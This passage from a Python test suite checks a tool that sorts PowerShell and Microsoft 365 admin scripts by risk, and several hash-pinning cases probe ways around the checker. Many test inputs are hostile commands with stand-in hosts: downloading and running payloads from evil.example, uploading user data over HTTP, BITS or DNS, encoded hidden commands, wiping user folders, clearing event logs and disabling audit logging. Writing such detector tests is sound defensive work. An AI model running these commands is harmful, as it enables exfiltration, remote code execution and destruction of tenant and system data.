    ('splat with quoted keys', "$p = @{\n  'Method' = 'DELETE'\n  'Uri' = 'https://graph.microsoft.com/v1.0/users/abc'\n}\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat index assignment', "$p = @{ Uri = 'https://graph.microsoft.com/v1.0/users/abc' }\n$p['Method'] = 'DELETE'\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat Add', "$p = @{ Uri = 'https://graph.microsoft.com/v1.0/users/abc' }\n$p.Add('Method','DELETE')\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat plus-equals', "$p = @{ Uri = 'https://graph.microsoft.com/v1.0/users/abc' }\n$p += @{ Method = 'DELETE' }\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat Add of a variable key', "$p = [ordered]@{}\n$p.Add($k, 'DELETE')\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('splat redefined in a branch', "$p = @{ Method = 'GET'; Uri = '/v1.0/users/x' }\nif ($x) { $p = @{ Method = 'DELETE'; Uri = '/v1.0/users/x' } }\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'decided when the script runs'),
    ('splat reused in sequence', "$p = @{ Method = 'GET'; Uri = '/v1.0/users' }\nInvoke-MgGraphRequest @p\n$p = @{ Method = 'DELETE'; Uri = '/v1.0/users/x' }\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP GET'),
    ('splat from a command', "$p = Get-Params\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('splat used in a function, redefined later', "function f { Invoke-MgGraphRequest @p }\n$p = @{ Method = 'GET'; Uri = '/v1.0/u' }\nf\n$p = @{ Method = 'DELETE'; Uri = '/v1.0/u' }\nf", 'CANNOT TELL', 'decided when the script runs'),
    ('splat defined with a scope', "$script:p = @{ Method = 'DELETE'; Uri = '/v1.0/u' }\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat aliased then changed', "$p = @{ Method = 'GET'; Uri = '/v1.0/u' }\n$q = $p\n$q.Method = 'DELETE'\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('splat member set by a variable', "$p = @{ Method = 'GET'; Uri = '/v1.0/u' }\n$p.$k = 'DELETE'\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('nested key does not hide the top-level key', "$p = @{ Uri = '/v1.0/u'; Body = @{ Method = 'GET' }; Method = 'DELETE' }\nInvoke-MgGraphRequest @p", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('splat key from an expanding string', "$p = @{ Uri = '/v1.0/u'; Method = 'GET' }\n$p[\"$m\"] = 'DELETE'\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('splat changed in a loop before it is assigned', "foreach ($i in 1..2) { Invoke-MgGraphRequest @p; $p = @{ Method = 'DELETE'; Uri = '/v1.0/u' } }\n$p = @{ Method = 'GET'; Uri = '/v1.0/u' }", 'CANNOT TELL', 'decided when the script runs'),
    ('assignment value on the next line', "$m = 'GET'\n$m =\n'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('assignment through the variable drive', "$m = 'GET'\nSet-Item variable:m 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('assignment inside a string subexpression', "$m = 'GET'\nWrite-Host \"$($m = 'DELETE')\"\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('assignment through Get-Variable', "$m = 'GET'\n(Get-Variable m).Value = 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('hash after a splat sigil is a comment', "Write-Host @x#'\nRemove-MgUser -UserId x\n#'", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('hash after a quoted part of a word', "Write-Host abc'x'#'\nRemove-MgUser -UserId x\n#'", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('statement after a switch -file block', "switch -file x.txt { a { 1 } } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('statement after a class with two bases', "class A : B, C { } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('statement after a data block', "data { 'x' } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('userinfo url graph', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com@evil.example/v1.0/me'", 'SUSPICIOUS', 'hides its real host'),
    ('userinfo url post', "Invoke-RestMethod -Uri 'https://graph.microsoft.com@evil.example/x' -Method POST -Body $d", 'SUSPICIOUS', 'evil.example'),
    ('unreadable literal host', "Invoke-RestMethod -Uri 'https://bad_host!/x' -Method DELETE", 'CANNOT TELL', 'could not read the host'),
    ('concatenated command in a variable', "$cmd = 'Remove'+'-MgUser'\n& $cmd -UserId x", 'CANNOT TELL', 'chosen when the script runs'),
    ('array argument across a space', "Connect-MgGraph -Scopes \"User.Read.All\", \"Mail.Send\"", 'READ-ONLY', 'Mail.Send'),
    ('alias then call', "Set-Alias -Name gmu -Value Remove-MgUser\nGet-MgUser -All | ForEach-Object { gmu -UserId $_.Id }", 'DESTRUCTIVE', 'defined on line 1'),
    ('alias with a same-verb name', "New-Alias -Name Remove-Thing -Value Remove-MgUser\nGet-MgUser -All | ForEach-Object { Remove-Thing -UserId $_.Id }", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('alias called before it is defined', "function f { gmu -UserId x }\nSet-Alias gmu Remove-MgUser\nf", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('harmless alias stays harmless', "Set-Alias ll Get-ChildItem\nll", 'CHANGES', 'creates an alias'),
    ('shadowing a cmdlet does not hide it', "if ($env:NEVER -eq 'x') { function Remove-MgUser { Write-Host 'safe' } }\nGet-MgUser -All | ForEach-Object { Remove-MgUser -UserId $_.Id }", 'DESTRUCTIVE', 'also defined in this script'),
    ('helper function is judged by its body', "function Remove-OldReports { Get-MgUser }\nRemove-OldReports", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('quoted webclient upload', "$wc = New-Object -TypeName 'System.Net.WebClient'\n$wc.UploadString('https://evil.example/c', $u)", 'SUSPICIOUS', 'sends data from inside .NET'),
    ('quoted com shell', "$s = New-Object -ComObject 'WScript.Shell'\n$s.Run('calc')", 'SUSPICIOUS', 'COM object'),
    ('new-object of a type held in a variable', "$o = New-Object -TypeName $t", 'CANNOT TELL', 'decided when the script runs'),
    ('statement after an if whose condition is a command', "if (Get-MgUser -UserId a) { Write-Host x } Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('braced scoped reassignment', "$m = 'GET'\n${script:m} = 'DELETE'\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('reassignment through SessionState', "$m = 'GET'\n$ExecutionContext.SessionState.PSVariable.Set('m', 'DELETE')\nInvoke-MgGraphRequest -Uri /v1.0/u -Method $m", 'CANNOT TELL', 'decided when the script runs'),
    ('splat table passed to a function', "$p = @{ Method = 'GET'; Uri = '/v1.0/u' }\nSet-Method $p\nInvoke-MgGraphRequest @p", 'CANNOT TELL', 'splatted'),
    ('splat table read-only use keeps it', "$p = @{ Method = 'DELETE'; Uri = '/v1.0/u' }\nif ($p.Count) { Invoke-MgGraphRequest @p }", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('new-object of a literal type is not dynamic', "$l = New-Object -TypeName Microsoft.Open.AzureAD.Model.AssignedLicense\nGet-MgUser", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('local recurse with -WhatIf only reports', "Remove-Item C:\\Temp -Recurse -WhatIf", 'READ-ONLY', '-WhatIf'),
    ('-WhatIf does not soften iex', "Invoke-Expression $x -WhatIf", 'SUSPICIOUS', 'runs text as code'),
    ('doubled quotes inside a string', "Write-Host \"say \"\"hi\"\" now\"\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('pfx export writes a private key', "Export-PfxCertificate -Cert Cert:\\LocalMachine\\My\\abc -FilePath c.pfx -Password $p", 'CHANGES', 'private key'),
    ('NUL in a script cannot pose as a placeholder', "Get-MgUser\x000\x00\nRemove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('download to an env path then run', "Invoke-WebRequest -Uri https://evil.example/t.exe -OutFile \"$env:TEMP\\t.exe\"\n& \"$env:TEMP\\t.exe\"", 'SUSPICIOUS', 'downloaded'),
    ('graph content download then run', "Get-MgDriveItemContent -DriveId a -DriveItemId b -OutFile .\\tool.exe\n& .\\tool.exe", 'SUSPICIOUS', 'downloaded'),
    ('graph request output file then run', "Invoke-MgGraphRequest -Uri /v1.0/me/drive/items/x/content -OutputFilePath .\\t.ps1\n.\\t.ps1", 'SUSPICIOUS', 'downloaded'),
    ('download piped to a file then run', "(Invoke-WebRequest https://evil.example/x).Content | Set-Content -Path .\\x.ps1\n.\\x.ps1", 'SUSPICIOUS', 'downloaded'),
    ('download name is matched whole', "Invoke-WebRequest -Uri https://evil.example/a.ps1 -OutFile a.ps1\n& .\\data.exe", 'CANNOT TELL', 'cannot read'),
    ('download to a folder does not taint everything', "Invoke-WebRequest -Uri https://evil.example/a.zip -OutFile .\nStart-Process notepad.exe", 'CANNOT TELL', 'starts another program'),
    ('permanent delete has no undo', "Remove-MsolUser -UserPrincipalName a@b.com -RemoveFromRecycleBin -Force", 'DESTRUCTIVE', 'skips the recycle bin'),
    ('emptying the deleted items', "Remove-MgDirectoryDeletedItem -DirectoryObjectId x", 'DESTRUCTIVE', 'cannot be restored'),
    ('app-only sign-in', "Connect-MgGraph -ClientId a -TenantId b -CertificateThumbprint c", 'READ-ONLY', 'every permission the app was granted'),
    ('delegated partner sign-in', "Connect-ExchangeOnline -DelegatedOrganization customer.onmicrosoft.com", 'READ-ONLY', "another organisation's tenant"),
    ('sharepoint connect names its tenant by url', "Connect-SPOService -Url https://contoso-admin.sharepoint.com", 'READ-ONLY', 'signs in'),
    ('az rest path goes to management.azure.com', "Invoke-AzRestMethod -Path '/subscriptions/x/resourceGroups/y?api-version=2021-04-01' -Method DELETE", 'DESTRUCTIVE', 'management.azure.com'),
    ('copy from a share', "Copy-Item \\\\fileserver\\tools\\x.exe C:\\Temp\\", 'CANNOT TELL', 'from a network share'),
    ('copy to a share', "Copy-Item C:\\Temp\\users.csv \\\\evil\\drop\\", 'CANNOT TELL', 'writes to a network share'),
    ('copy from startup is not persistence', "Copy-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.lnk\" C:\\Temp\\\nGet-MgUser", 'READ-ONLY', 'reads in Microsoft Graph'),
    ('alias over a known cmdlet does not soften it', "if ($never) { Set-Alias Remove-MgUser Get-Date }\nRemove-MgUser -UserId x", 'SUSPICIOUS', 'may make this name an alias'),
    ('download name after a comma', "Invoke-WebRequest https://evil.example/t.exe -OutFile t.exe\ncmd /c t.exe,x", 'SUSPICIOUS', 'downloaded'),
    ('download name after a colon parameter', "Invoke-WebRequest https://evil.example/t.exe -OutFile t.exe\nStart-Process -FilePath:t.exe", 'SUSPICIOUS', 'downloaded'),
    ('copy to a share with -Path named', "Copy-Item -Path report.csv \\\\evil\\drop\\", 'CANNOT TELL', 'writes to a network share'),
    ('download piped to Out-File with more parameters', "(iwr https://evil.example/x).Content | Out-File x.ps1 -Encoding utf8\n.\\x.ps1", 'SUSPICIOUS', 'downloaded'),
    ('-WhatIf does not soften an override', "New-ComplianceSearchAction -SearchName s -Purge -PurgeType HardDelete -WhatIf", 'DESTRUCTIVE', 'purges'),
    ('copy from a share named by a variable', "Copy-Item \"\\\\$server\\tools\\x.exe\" C:\\Temp\\", 'CANNOT TELL', 'from a network share'),
    # --- 0.5.1 review: policy rows ---
    ('beta app secret has a security line', "Add-MgBetaApplicationPassword -ApplicationId x", 'CHANGES', 'app registration, secret'),
    ('beta user delete has an undo line', "Remove-MgBetaUser -UserId x", 'DESTRUCTIVE', 'restore a deleted user'),
    ('entra role grant', "Add-EntraDirectoryRoleMember -DirectoryRoleId a -RefObjectId b", 'CHANGES', 'grants an admin role'),
    ('graph device retire', "Invoke-MgRetireDeviceManagementManagedDevice -ManagedDeviceId x", 'DESTRUCTIVE', 'retires'),
    ('graph request alias', "Invoke-GraphRequest -Method DELETE -Uri /v1.0/users/abc", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('intune graph request', "Invoke-MSGraphRequest -HttpMethod DELETE -Url 'https://graph.microsoft.com/v1.0/users/abc'", 'DESTRUCTIVE', 'HTTP DELETE'),
    ('domain federation', "Set-MsolDomainAuthentication -DomainName a.com -Authentication Federated -PassiveLogOnUri https://evil.example/adfs/ls", 'CHANGES', 'federation'),
    ('audit off with a colon', "Set-Mailbox -Identity a -AuditEnabled:$false", 'CHANGES', 'weakens audit logging'),
    ('send on behalf', "Set-Mailbox -Identity a -GrantSendOnBehalfTo b", 'CHANGES', 'access to a mailbox'),
    ('spam filter allow-list', "Set-HostedContentFilterPolicy -Identity Default -AllowedSenderDomains evil.example", 'CHANGES', 'mail protection'),
    ('consent policy', "Update-MgPolicyPermissionGrantPolicy -PermissionGrantPolicyId x", 'CHANGES', 'consent'),
    ('site collection admin', "Add-PnPSiteCollectionAdmin -Owners a@b.com", 'CHANGES', 'owner rights'),
    ('journal rule import', "Import-JournalRuleCollection -FileData $d", 'DESTRUCTIVE', 'every journal rule'),
    ('pnp search is a read', "Submit-PnPSearchQuery -Query 'x'", 'READ-ONLY', 'search query'),
    ('start-process with an encoded command', "Start-Process powershell -ArgumentList '-enc AAAAAAAAAAAAAAAAAAAAAAAAAAAA' -WindowStyle Hidden", 'SUSPICIOUS', 'encoded command'),
    ('powershell -Command is read as code', "powershell.exe -NoProfile -Command 'Remove-Item -Recurse -Force C:\\Users\\*'", 'DESTRUCTIVE', 'inside powershell -Command'),
    ('powershell -EncodedCommand is decoded', "powershell -EncodedCommand UgBlAG0AbwB2AGUALQBNAGcAVQBzAGUAcgAgAC0AVQBzAGUAcgBJAGQAIAB4AA==", 'SUSPICIOUS', 'Remove-MgUser'),
    ('new service', "New-Service -Name Upd -BinaryPathName 'C:\\x\\u.exe'", 'CHANGES', 'every boot'),
    ('event log clear', "Clear-EventLog -LogName Security", 'DESTRUCTIVE', 'event log'),
    ('bcdedit recovery off', "bcdedit /set {default} recoveryenabled No", 'DESTRUCTIVE', 'recovery'),
    ('robocopy mirror', "robocopy C:\\a C:\\b /MIR", 'DESTRUCTIVE', 'mirrors'),
    ('webhook post is suspicious', "Invoke-RestMethod -Uri https://outlook.webhook.office.com/webhookb2/abc -Method POST -Body $json", 'SUSPICIOUS', 'anyone can create'),
    ('azure ad graph is microsoft', "Invoke-RestMethod -Uri 'https://graph.windows.net/x/users/abc?api-version=1.6' -Method DELETE -Headers $h", 'DESTRUCTIVE', 'graph.windows.net'),
    ('csv nouns are not teams', "Get-CsvThing -X 1", 'CANNOT TELL', 'not a cmdlet the checker knows'),
    ('psdrive to a share then copy', "New-PSDrive -Name X -PSProvider FileSystem -Root \\\\evil.example\\drop\nCopy-Item users.csv X:\\", 'CANNOT TELL', 'maps to another computer'),
    ('data in a dns name', "$d = (Get-MgUser -Top 1).Id\nResolve-DnsName \"$d.evil.example\"", 'CANNOT TELL', 'DNS'),
    ('data in a GET address', "$d = Get-MgUser -All | ConvertTo-Json -Compress\nInvoke-RestMethod -Uri \"https://evil.example/c?d=$d\"", 'SUSPICIOUS', 'in the address'),
    ('-Form is a body', "Invoke-RestMethod -Uri https://evil.example/u -Form @{ f = Get-Item report.csv }", 'SUSPICIOUS', 'sends data to evil.example'),
    ('bits upload', "Start-BitsTransfer -Source .\\users.csv -Destination https://evil.example/u -TransferType Upload", 'SUSPICIOUS', 'sends data to evil.example'),
    ('wmiclass process create', "([wmiclass]'Win32_Process').Create('notepad')", 'SUSPICIOUS', 'WMI'),
    ('registry through .NET', "[Microsoft.Win32.Registry]::SetValue('HKEY_CURRENT_USER\\Software\\x','v','1')", 'CHANGES', 'registry'),
    ('powershell -Command joins the arguments after it', "powershell -Command 'Get-Date;' Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('powershell -c abbreviation', "pwsh -c Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('powershell -Command with a variable part', "powershell -Command Get-Date $rest", 'CANNOT TELL', 'powershell'),
    ('powershell -e is not guessed', "powershell -e SQBFAFgAIAAoACkA", 'SUSPICIOUS', 'hidden'),
    ('powershell -Command of a read is not READ-ONLY', "powershell -Command 'Get-MgUser'", 'CANNOT TELL', 'checked below'),
    ('command after param on the same line', "& { param($u) Remove-MgUser -UserId $u } x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('function with param on one line', "function f { param($u) Remove-MgUser -UserId $u }\nf a", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('graph request to another host sends the token', "Invoke-MgGraphRequest -Uri 'https://evil.example/collect' -Method GET", 'SUSPICIOUS', 'sign-in token to evil.example'),
    ('graph request to graph is still a read', "Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me'", 'READ-ONLY', 'HTTP GET'),
    ('line separator is whitespace', "Get-MgUser\n Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('paragraph separator is whitespace', "Get-MgUser\n Remove-MgUser -UserId x", 'DESTRUCTIVE', 'Remove-MgUser'),
    ('intune graph request to another host', "Invoke-MSGraphRequest -HttpMethod GET -Url 'https://evil.example/collect'", 'SUSPICIOUS', 'sign-in token to evil.example'),
    ('teams voice cmdlets are teams', "Set-CsVoiceRoutingPolicy -Identity x -OnlinePstnUsages a", 'CHANGES', 'Microsoft Teams'),
    ('else after a block is not a command', "if ($a) { Get-MgUser } else { Get-MgGroup }", 'READ-ONLY', 'reads in Microsoft Graph'),
]


def follow_checks():
    """A called .ps1 on this computer is read and folded in; a script that calls itself stops; column names are not forwarding."""
    import os
    import tempfile
    out = []
    with tempfile.TemporaryDirectory() as d:
        Path(d, 'child.ps1').write_text("Remove-MgUser -UserId x\n")
        Path(d, 'loop.ps1').write_text("& \"$PSScriptRoot/loop.ps1\"\n")
        Path(d, 'fan.ps1').write_text("& ./child.ps1\n" * 40)
        Path(d, 'mod.psm1').write_text("Remove-MgUser -UserId x\n")
        os.environ['PSCHECK_TEST_DIR'] = d
        for text, want, needle in [('& "./child.ps1"', 'DESTRUCTIVE', 'Remove-MgUser'),
                                   ('& "$env:PSCHECK_TEST_DIR/child.ps1"', 'DESTRUCTIVE', 'Remove-MgUser'),
                                   ('powershell -File ./child.ps1', 'DESTRUCTIVE', 'Remove-MgUser'),
                                   ('& ./loop.ps1', 'CANNOT TELL', 'stops following'),
                                   ('& ./fan.ps1', 'DESTRUCTIVE', 'listed once'),
                                   ('Import-Module $PSScriptRoot/mod.psm1', 'DESTRUCTIVE', 'Remove-MgUser')]:
            fs = C.check_text(text, 'follow', Path(d))
            hay = ' | '.join(f.what for f in fs)
            if L[m365check.verdict(fs)] != want or needle.lower() not in hay.lower():
                out.append(f'follow {text}: verdict {L[m365check.verdict(fs)]} (want {want}); findings: {hay}')
            if text == '& ./fan.ps1' and sum('Remove-MgUser' in f.what for f in fs) != 1:
                out.append('follow fan-out: child.ps1 was listed more than once')
        del os.environ['PSCHECK_TEST_DIR']
    guard = "if ($bad) { throw 'WRONG TENANT' }"
    tid = "'11111111-2222-3333-4444-555555555555'"
    for text, want in [(f"Connect-ExchangeOnline\n$bad = Get-ConnectionInformation | ? {{ $_.State -eq 'Connected' -and $_.TenantID -ne {tid} }}\n{guard}\nSet-Mailbox m -Type Shared", 'tenant guarded'),
                       (f"Connect-MgGraph -Scopes User.ReadWrite.All\nif ((Get-MgContext).TenantId -ne {tid}) {{ throw 'x' }}\nUpdate-MgUser -UserId x -AccountEnabled:$false", 'tenant guarded'),
                       (f"Connect-ExchangeOnline\nSet-Mailbox m -Type Shared\n$bad = Get-ConnectionInformation | ? {{ $_.TenantID -ne {tid} }}\n{guard}", 'comes after the first change'),
                       ("Connect-ExchangeOnline\nSet-Mailbox m -Type Shared", 'no tenant named')]:
        notes = ' | '.join(f.note for f in C.check_text(text, 'guard'))
        if want not in notes:
            out.append(f'tenant guard: wanted "{want}" in: {notes}')
    fs = C.check_text("New-TransportRule -Name x -ExceptIfSentTo 'a@b.example'", 'sentto')
    if not any('-SentToMemberOf' in f.note for f in fs):
        out.append('SentTo note missing on -ExceptIfSentTo')
    two = m365check.render('p', C.check_text("Set-Mailbox a -Type Shared\nSet-Mailbox b -Type Shared", 'p'), C.policy)
    one = m365check.render('p', C.check_text("Set-Mailbox a -Type Shared", 'p'), C.policy)
    if 'Not all-or-nothing: 2 changes' not in two or 'Not all-or-nothing' in one:
        out.append('partial-run line wrong')
    fs = C.check_text("Get-Mailbox m | Format-List ForwardingAddress, ForwardingSmtpAddress, DeliverToMailboxAndForward", 'fl')
    if any(f.security for f in fs):
        out.append('forwarding: column names in Format-List raised a SECURITY line')
    return out


def pin_checks():
    """A download pinned by SHA-256 is read as the local file with that hash; anything that breaks the pin stays SUSPICIOUS."""
    import hashlib
    import tempfile
    out = []
    dl = "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/x/y/main/a.ps1' -OutFile ./a.ps1\n"
    with tempfile.TemporaryDirectory() as d, tempfile.TemporaryDirectory() as pins:
        Path(pins, 'a.ps1').write_text("Get-MgUser -All\n")
        sha = hashlib.sha256(Path(pins, 'a.ps1').read_bytes()).hexdigest().upper()
        other = 'AB' * 32
        ok = f"if ((Get-FileHash ./a.ps1 -Algorithm SHA256).Hash -ne '{sha}') {{ Write-Host 'HASH MISMATCH' }} else {{ Unblock-File ./a.ps1; ./a.ps1 -Out ./r.csv }}"
        cases = [
            ('pin resolved', dl + ok, 'CHANGES', 'READ-ONLY', 'pinned to sha256'),
            ('pin -eq, default algorithm, dot-sourced', dl + f"if ((Get-FileHash -Path './a.ps1').Hash -eq '{sha}') {{ . ./a.ps1 }}", 'READ-ONLY', 'READ-ONLY', 'pinned to sha256'),
            ('pin with a stop and no else', dl + f"if ((Get-FileHash ./a.ps1 -Algorithm SHA256).Hash.ToUpper() -ne '{sha.lower()}'.ToUpper()) {{ Write-Host 'bad'; exit 1 }}\nUnblock-File ./a.ps1\n./a.ps1", 'CHANGES', 'READ-ONLY', 'pinned to sha256'),
            ('stop inside a nested if is not a stop', dl + f"if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ if ($strict) {{ exit 1 }} }}\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('stop that is not last', dl + f"if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ return; Write-Host 'x' }}\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('stop form ends with its enclosing block', dl + f"& {{ if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ exit 1 }} }}\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('pin run by powershell -File', dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ Write-Host 'ok'; pwsh -File ./a.ps1 }}", 'READ-ONLY', 'READ-ONLY', 'pinned to sha256'),
            ('Set-Location between check and run', dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ Set-Location C:/evil; ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('file replaced without naming it', dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ $f = './a' + '.ps1'; Copy-Item b.ps1 $f; ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('Get-FileHash redefined', "function Get-FileHash { param($p) [pscustomobject]@{Hash='x'} }\n" + dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('Get-FileHash aliased', "Set-Alias Get-FileHash Get-Date\n" + dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('Unblock-File redefined', "function Unblock-File { param($p) }\n" + dl + ok, 'SUSPICIOUS', None, 'downloaded'),
            ('trap resumes after the throw', "trap { continue }\n" + dl + f"if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ throw 'bad' }}\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('pin not on this computer', dl + ok.replace(sha, other), 'CANNOT TELL', None, 'pass --pin-dir'),
            ('use outside the guarded branch', dl + f"if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ Write-Host 'x' }} else {{ Write-Host 'ok' }}\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('warns then runs on the same line', dl + f"if ((Get-FileHash ./a.ps1).Hash -ne '{sha}') {{ Write-Host 'x' }}; ./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('use before the check', dl + f"./a.ps1\nif ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('use in the mismatch branch', dl + f"if ((Get-FileHash ./a.ps1).Hash -eq '{sha}') {{ Write-Host 'ok' }} else {{ ./a.ps1 }}", 'SUSPICIOUS', None, 'downloaded'),
            ('second download after the check', dl + ok.replace('Unblock-File ./a.ps1;', "Invoke-WebRequest -Uri 'https://evil.example/a.ps1' -OutFile ./a.ps1;"), 'SUSPICIOUS', None, 'downloaded'),
            ('hash computed, never compared', dl + "$h = Get-FileHash ./a.ps1\n./a.ps1", 'SUSPICIOUS', None, 'downloaded'),
            ('MD5 pin', dl + ok.replace('SHA256', 'MD5'), 'SUSPICIOUS', None, 'downloaded'),
            ('SHA1 pin', dl + ok.replace('SHA256', 'SHA1'), 'SUSPICIOUS', None, 'downloaded'),
            ('hash compared to a variable', dl + f"$want = '{sha}'\n" + ok.replace(f"'{sha}'", '$want'), 'SUSPICIOUS', None, 'downloaded'),
            ('pin on a different file', dl + ok.replace('Get-FileHash ./a.ps1', 'Get-FileHash ./b.ps1'), 'SUSPICIOUS', None, 'downloaded'),
        ]
        checker = m365check.Checker(C.policy)
        checker.pin_dirs = [pins]
        for name, text, want, tenant_want, needle in cases:
            fs = checker.check_text(text, 'pin', Path(d))
            hay = ' | '.join(f'{f.what} {f.note}' for f in fs)
            tenant = L[max((f.level for f in fs if f.target == 'tenant'), default=0)]
            if L[m365check.verdict(fs)] != want or needle.lower() not in hay.lower() or (tenant_want and tenant != tenant_want):
                out.append(f'pin {name}: verdict {L[m365check.verdict(fs)]} (want {want}), tenant {tenant}; findings: {hay}')
            if want != 'SUSPICIOUS' and any(f.security for f in fs):
                out.append(f'pin {name}: a pinned Unblock-File still carries a SECURITY line')
    # The real handover: the repo's own audit script, downloaded and pinned.
    entra = HERE.parent.parent / 'Entra ID'
    snippet = ("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PaulOgier/PowerShell/main/Entra%20ID/Get-EntraSmsVoiceMfaExposure.ps1' -OutFile ./Get-EntraSmsVoiceMfaExposure.ps1\n"
               "if ((Get-FileHash ./Get-EntraSmsVoiceMfaExposure.ps1 -Algorithm SHA256).Hash -ne '0F4E9614E7E394EC156595824879D38F27B05C74E59CB67F55D73FB39692A65B') "
               "{ Write-Host 'HASH MISMATCH: not running' -ForegroundColor Red } else { Unblock-File ./Get-EntraSmsVoiceMfaExposure.ps1; "
               "./Get-EntraSmsVoiceMfaExposure.ps1 -TenantId 11111111-2222-3333-4444-555555555555 -OutputPath ./x.csv }\n")
    if (entra / 'Get-EntraSmsVoiceMfaExposure.ps1').is_file():
        fs = C.check_text(snippet, 'pinned entra', entra)
        tenant = max((f.level for f in fs if f.target == 'tenant'), default=0)
        if L[tenant] != 'READ-ONLY' or L[m365check.verdict(fs)] != 'CHANGES' or not any('read-only scopes' in f.note for f in fs):
            out.append(f'pinned Entra snippet: tenant {L[tenant]}, overall {L[m365check.verdict(fs)]}')
    return out


def run():
    failures = []
    for name, text, want, needle in CASES:
        findings = C.check_text(text, name)
        got = L[m365check.verdict(findings)]
        hay = ' | '.join(f'{f.what} {f.security} {f.note} {f.undo}' for f in findings)
        if got != want or needle.lower() not in hay.lower():
            failures.append(f'{name}: verdict {got} (want {want}); findings: {hay}')
    # The repo's own audit script: a real-world read-only fixture whose only non-read lines install modules.
    entra = HERE.parent.parent / 'Entra ID' / 'Get-EntraSmsVoiceMfaExposure.ps1'
    if entra.is_file():
        fs = C.check_file(entra)
        tenant = max((f.level for f in fs if f.target == 'tenant'), default=0)
        if L[tenant] != 'READ-ONLY' or L[m365check.verdict(fs)] != 'CHANGES':
            failures.append(f'Entra fixture: tenant {L[tenant]}, overall {L[m365check.verdict(fs)]}')
        if not any('read-only scopes' in f.note for f in fs):
            failures.append('Entra fixture: Connect-MgGraph scopes were not resolved through $connect and $scopes')
    # Which side of the summary a finding lands on: Tenant, This computer, or Could be either ('').
    for text, want in (("Format-Volume -DriveLetter D", 'local'), ("Remove-Item C:\\x -Recurse", 'local'),
                       ("Restart-Computer -Force", 'local'), ("Set-FrobSetting -Id UTC", ''), ("Set-TimeZone -Id UTC", 'local'), ("Remove-MgUser -UserId x", 'tenant')):
        fs = C.check_text(text, 'target')
        got = max(fs, key=lambda f: f.level).target
        if got != want:
            failures.append(f'target of {text!r}: {got!r} (want {want!r})')
    # Bytes that are not UTF-8 are read both ways; the worse reading stands.
